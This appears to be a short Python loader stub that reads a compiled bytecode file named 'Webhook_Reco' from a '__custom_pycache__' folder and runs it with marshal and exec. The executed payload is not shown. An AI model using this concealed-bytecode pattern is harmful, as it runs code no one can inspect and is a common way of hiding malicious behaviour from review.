
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Webhook_Reco_3658cb3680bd43beb715ee8a0a27e850.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
